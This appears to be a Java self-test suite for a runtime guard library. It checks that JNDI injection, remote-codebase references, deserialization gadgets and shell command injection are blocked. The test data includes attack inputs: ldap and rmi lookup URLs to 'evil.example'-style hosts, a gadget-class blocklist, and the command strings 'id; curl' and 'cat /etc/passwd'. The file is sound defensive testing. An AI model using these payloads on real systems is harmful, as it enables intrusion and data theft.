// SPDX-License-Identifier: BSD-2-Clause
// Copyright (c) 2026 Authors of shirudo

package com.shirudo.runtimeguard;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InvalidClassException;
import java.io.ObjectInputFilter;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.List;
import java.util.Map;
import javax.management.BadAttributeValueExpException;
import javax.naming.CompositeName;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Name;
import javax.naming.NamingException;
import javax.naming.RefAddr;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.naming.spi.NamingManager;
import javax.naming.spi.ObjectFactory;

/**
 * Self-test suite verifying JNDI scheme/factory/codebase blocking, local
 * ObjectFactory instantiation, JEP 415 per-stream ObjectInputFilter merging,
 * ShellExecGuard blocking, benign pass-through, and observe mode.
 */
public final class RuntimeGuardTest {

    private RuntimeGuardTest() {}

    public static final class LocalConfigFactory implements ObjectFactory {
        public LocalConfigFactory() {}

        @Override
        public Object getObjectInstance(Object obj, Name name, Context nameCtx,
                                        Hashtable<?, ?> environment) {
            if (obj instanceof Reference ref) {
                RefAddr addr = ref.get("endpoint");
                if (addr != null) {
                    return "resolved:" + addr.getContent();
                }
            }
            return "resolved:default";
        }
    }

    private static byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(out)) {
            oos.writeObject(obj);
        }
        return out.toByteArray();
    }

    private static Object deserialize(byte[] bytes) throws Exception {
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes))) {
            return ois.readObject();
        }
    }

    private static Object deserializeWithCustomFilter(byte[] bytes,
                                                      ObjectInputFilter filter) throws Exception {
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes))) {
            ois.setObjectInputFilter(filter);
            return ois.readObject();
        }
    }

    private static void expectJndiBlocked(Context ctx, String url) throws Exception {
        try {
            ctx.lookup(url);
            throw new AssertionError("Expected JNDI block for " + url);
        } catch (SecurityException expected) {
            // blocked as expected
        }
    }

    private static void expectRefBlocked(Object refOrReferenceable, String label)
            throws Exception {
        try {
            NamingManager.getObjectInstance(refOrReferenceable, null, null, null);
            throw new AssertionError("Expected Reference block for " + label);
        } catch (SecurityException expected) {
            // blocked as expected
        }
    }

    public static void main(String[] args) throws Exception {
        System.setProperty(GuardMode.MODE_PROPERTY, "enforce");
        InitialContext ctx = new InitialContext();

        // 1. Remote JNDI schemes and CompositeName quoted/escaped bypasses are blocked.
        expectJndiBlocked(ctx, "ldap://127.0.0.1:1389/Exploit");
        expectJndiBlocked(ctx, "ldaps://evil.example:636/Payload");
        expectJndiBlocked(ctx, "rmi://127.0.0.1:1099/Exploit");
        expectJndiBlocked(ctx, "dns://127.0.0.1/evil.example");
        expectJndiBlocked(ctx, "iiop://127.0.0.1:900/Exploit");
        expectJndiBlocked(ctx, "corba://127.0.0.1/Exploit");
        expectJndiBlocked(ctx, "\"ldap://127.0.0.1:1389/Quoted\"");
        expectJndiBlocked(ctx, "'rmi://127.0.0.1:1099/SingleQuoted'");
        expectJndiBlocked(ctx, "\\ldap://127.0.0.1:1389/Escaped");
        CompositeName composite = new CompositeName();
        composite.add("ldap://127.0.0.1:1389/CompositeComponent");
        try {
            ctx.lookup(composite);
            throw new AssertionError("Expected CompositeName JNDI block");
        } catch (SecurityException expected) {
            // blocked as expected
        }

        // 1b. Remote INITIAL_CONTEXT_FACTORY and PROVIDER_URL tokens are blocked.
        for (String factory : List.of(
                "com.sun.jndi.ldap.LdapCtxFactory",
                "com.sun.jndi.rmi.registry.RegistryContextFactory",
                "com.sun.jndi.dns.DnsContextFactory",
                "com.sun.jndi.cosnaming.CNCtxFactory")) {
            Hashtable<String, String> env = new Hashtable<>();
            env.put(Context.INITIAL_CONTEXT_FACTORY, factory);
            try {
                new InitialContext(env).lookup("cn=Exploit");
                throw new AssertionError("Expected factory block for " + factory);
            } catch (SecurityException expected) {
                // blocked as expected
            }
        }
        Hashtable<String, String> providerEnv = new Hashtable<>();
        providerEnv.put(Context.PROVIDER_URL, "file:/tmp/local ldap://127.0.0.1:1389/Evil");
        try {
            new InitialContext(providerEnv).lookup("cn=Exploit");
            throw new AssertionError("Expected PROVIDER_URL token block");
        } catch (SecurityException expected) {
            // blocked as expected
        }

        // 2. Local java:comp/env context lookups, Referenceable/Reference codebase
        //    blocking, and local ObjectFactory instantiation work properly.
        Object envCtx = ctx.lookup("java:comp/env");
        if (!(envCtx instanceof Context)) {
            throw new AssertionError("Expected local java:comp/env Context");
        }
        ctx.bind("java:comp/env/serviceName", "billing-api");
        if (!"billing-api".equals(ctx.lookup("java:comp/env/serviceName"))) {
            throw new AssertionError("Local java:comp/env binding round-trip failed");
        }

        expectRefBlocked(new Reference("Payload", "EvilFactory",
                "jar:http://127.0.0.1:8080/evil.jar!/"), "jar:http codebase");
        expectRefBlocked(new Reference("Payload", "EvilFactory",
                "file://192.0.2.10/share/evil.jar"), "UNC/remote file codebase");
        expectRefBlocked(new Reference("Payload", "EvilFactory",
                "file:/tmp/a.jar http://127.0.0.1:8080/evil.jar"), "space-separated codebase");
        Referenceable remoteRefable = () -> new Reference(
                "Payload", "EvilFactory", "http://127.0.0.1:8080/");
        expectRefBlocked(remoteRefable, "Referenceable remote codebase");

        Reference localRef = new Reference(
                String.class.getName(), LocalConfigFactory.class.getName(), null);
        localRef.add(new StringRefAddr("endpoint", "https://api.internal"));
        Object resolvedDirect = NamingManager.getObjectInstance(localRef, null, null, null);
        if (!"resolved:https://api.internal".equals(resolvedDirect)) {
            throw new AssertionError("Local ObjectFactory was not instantiated: " + resolvedDirect);
        }
        ctx.bind("java:comp/env/apiEndpoint", (Referenceable) () -> localRef);
        if (!"resolved:https://api.internal".equals(ctx.lookup("java:comp/env/apiEndpoint"))) {
            throw new AssertionError("Bound local Referenceable did not resolve via ObjectFactory");
        }

        // 3. Gadget deserialization is rejected both by default and when a stream
        //    installs its own permissive ObjectInputFilter (JEP 415 factory).
        byte[] gadgetBytes = serialize(new BadAttributeValueExpException("gadget"));
        boolean deserRejected = false;
        try {
            deserialize(gadgetBytes);
        } catch (InvalidClassException expected) {
            deserRejected = true;
        }
        if (!deserRejected) {
            throw new AssertionError("Expected gadget deserialization to throw InvalidClassException");
        }
        boolean streamFilterBypassBlocked = false;
        try {
            deserializeWithCustomFilter(gadgetBytes, info -> ObjectInputFilter.Status.ALLOWED);
        } catch (InvalidClassException expected) {
            streamFilterBypassBlocked = true;
        }
        if (!streamFilterBypassBlocked) {
            throw new AssertionError("Per-stream setObjectInputFilter bypassed DeserializationGuard");
        }
        if (!DeserializationGuard.isBlockedClassName(
                "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl")
                || !DeserializationGuard.isBlockedClassName(
                "org.apache.commons.collections.functors.InvokerTransformer")
                || !DeserializationGuard.isBlockedClassName(
                "com.sun.rowset.JdbcRowSetImpl")
                || !DeserializationGuard.isBlockedClassName(
                "org.apache.commons.beanutils.BeanComparator")) {
            throw new AssertionError("Expected canonical gadget classes in blocklist");
        }

        // 4. Benign JDK types serialize and deserialize normally (with and without stream filter).
        List<String> list = new ArrayList<>(List.of("alpha", "beta"));
        Map<String, Integer> map = new HashMap<>();
        map.put("ok", 200);
        if (!list.equals(deserialize(serialize(list)))
                || !map.equals(deserializeWithCustomFilter(
                        serialize(map), info -> ObjectInputFilter.Status.UNDECIDED))) {
            throw new AssertionError("Benign deserialization failed");
        }

        // 5. ShellExecGuard blocks shell wrappers and metacharacters, allows safe argv.
        boolean shellBlocked = false;
        try {
            ShellExecGuard.checkCommand("/bin/sh", "-c", "id; curl http://127.0.0.1");
        } catch (SecurityException expected) {
            shellBlocked = true;
        }
        if (!shellBlocked) {
            throw new AssertionError("Expected /bin/sh -c to be blocked");
        }
        boolean metaBlocked = false;
        try {
            ShellExecGuard.checkCommand("ping -c 1 127.0.0.1 && cat /etc/passwd");
        } catch (SecurityException expected) {
            metaBlocked = true;
        }
        if (!metaBlocked) {
            throw new AssertionError("Expected command chaining metacharacters to be blocked");
        }
        ShellExecGuard.checkCommand("/usr/bin/id", "-u");

        // 6. Observe mode logs and increments counters without throwing SecurityException.
        System.setProperty(GuardMode.MODE_PROPERTY, "observe");
        long obsBefore = GuardMode.observedCount();
        try {
            ctx.lookup("ldap://127.0.0.1:1389/ObserveOnly");
        } catch (NamingException ignored) {
            // NamingException (not SecurityException) when no local LDAP server listens
        }
        Reference obsRef = new Reference(
                String.class.getName(), LocalConfigFactory.class.getName(),
                "http://127.0.0.1:8080/unused.jar");
        if (!"resolved:default".equals(NamingManager.getObjectInstance(obsRef, null, null, null))) {
            throw new AssertionError("Observe mode should still instantiate local ObjectFactory");
        }
        Object obsGadget = deserialize(gadgetBytes);
        if (!(obsGadget instanceof BadAttributeValueExpException)) {
            throw new AssertionError("Observe mode should allow gadget deserialization");
        }
        ShellExecGuard.checkCommand("/bin/bash", "-c", "echo observed");
        if (GuardMode.observedCount() < obsBefore + 4) {
            throw new AssertionError("Observe mode did not increment observedCount for all checks");
        }

        System.setProperty(GuardMode.MODE_PROPERTY, "enforce");
        System.out.println("RuntimeGuardTest: all assertions passed");
    }
}
